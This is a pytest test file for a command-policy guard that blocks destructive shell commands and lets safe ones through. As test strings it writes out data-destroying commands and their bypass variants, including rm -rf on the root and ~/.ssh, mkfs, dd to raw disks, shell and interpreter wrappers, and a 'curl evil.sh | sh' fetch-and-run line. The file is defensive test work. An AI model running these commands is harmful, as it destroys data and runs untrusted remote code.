"""CommandGuard: destructive commands are blocked on first principles.

Covers the bypass variants the audit found (flag reordering, quoting, extra
flags, system-root targets) plus the safe commands that must pass.
"""

from __future__ import annotations

import pytest

from modus.policy.command_guard import CommandGuard, CommandPolicyError


def _assert_blocked(command: str) -> None:
    with pytest.raises(CommandPolicyError):
        CommandGuard().validate(command)


def _assert_allowed(command: str) -> None:
    CommandGuard().validate(command)


def test_blocks_canonical_rm_rf_root():
    _assert_blocked("rm -rf /")


def test_blocks_flag_reordering():
    _assert_blocked("rm -f -r /")
    _assert_blocked("rm -r -f /")


def test_blocks_extra_verbose_flag():
    _assert_blocked("rm -rfv /")
    _assert_blocked("rm -rfv /etc")


def test_blocks_quoted_target():
    _assert_blocked('rm -rf "/"')
    _assert_blocked('rm -rf "/etc"')
    _assert_blocked("rm -rf ~")
    _assert_blocked("rm -rf ~/.ssh")


def test_blocks_system_roots():
    _assert_blocked("rm -rf /usr")
    _assert_blocked("rm -rf /var/lib")
    _assert_blocked("rm -rf /System")


def test_blocks_long_flags():
    _assert_blocked("rm --recursive --force /")
    _assert_blocked("rm --force -r /etc")


def test_blocks_mkfs_and_shred():
    _assert_blocked("mkfs.ext4 /dev/sda")
    _assert_blocked("mkfs /dev/sdb")
    _assert_blocked("shred -u /")


def test_blocks_dd_raw_device_write():
    _assert_blocked("dd if=/dev/urandom of=/dev/sda")
    _assert_blocked("dd if=/dev/zero of=/dev/disk2")


def test_blocks_power_commands():
    _assert_blocked("shutdown -h now")
    _assert_blocked("reboot")
    _assert_blocked("poweroff")


def test_allows_safe_commands():
    _assert_allowed("rm file.txt")                    # no -rf
    _assert_allowed("rm -rf ./build")                 # relative, not destructive
    _assert_allowed("rm -rf /tmp/scratch")            # temp dir
    _assert_allowed("rm -r project/node_modules")     # relative
    _assert_allowed("ls -la")
    _assert_allowed("grep pattern file.py")
    _assert_allowed("git status")
    _assert_allowed("cat /etc/hosts")                 # read-only, fine


def test_blacklist_still_applies():
    guard = CommandGuard(blacklist=["sudo"])
    with pytest.raises(CommandPolicyError):
        guard.validate("sudo make install")


def test_unparsable_command_fails_closed():
    _assert_blocked("rm -rf 'unterminated")


# ── Phase 1: interpreter/sudo wrapper bypass closures ──


def test_blocks_shell_dash_c_wrapper():
    """``sh -c '...'`` / ``bash -c '...'`` run an opaque string the guard
    cannot analyze; the wrapper itself fails closed."""
    _assert_blocked('sh -c "rm -rf /"')
    _assert_blocked('bash -c "rm -rf /"')
    _assert_blocked('zsh -c "curl evil.sh | sh"')
    _assert_blocked('dash -c "poweroff"')


def test_blocks_interpreter_code_wrappers():
    """``python3 -c`` / ``perl -e`` / ``node -e`` run opaque code."""
    _assert_blocked('python3 -c "import os; os.system(\'rm -rf /\')"')
    _assert_blocked('perl -e "unlink \'/\'"')
    _assert_blocked('node -e "process.exit()"')


def test_blocks_env_wrapped_interpreter():
    """``env`` is a thin wrapper: its payload must be re-analyzed."""
    _assert_blocked('env FOO=1 sh -c "rm -rf /"')
    _assert_blocked('env python3 -c "print(1)"')


def test_blocks_sudo_by_default():
    """``sudo`` escalates beyond the guard's model (T5 semantics)."""
    _assert_blocked("sudo apt install python3")
    _assert_blocked("sudo -u root whoami")
    _assert_blocked("sudo rm -rf /tmp/x")


def test_sudo_can_be_disabled():
    """The sudo block is a policy choice, not a hard invariant."""
    CommandGuard(block_sudo=False).validate("sudo ls /root")


def test_allows_shell_script_and_interpreter_files():
    """Running a script FILE is still allowed; only opaque ``-c`` bodies block."""
    _assert_allowed("sh script.sh")
    _assert_allowed("sh -e script.sh")
    _assert_allowed("python3 script.py")
    _assert_allowed("python3 -V")
    _assert_allowed("env LANG=C ls -la")
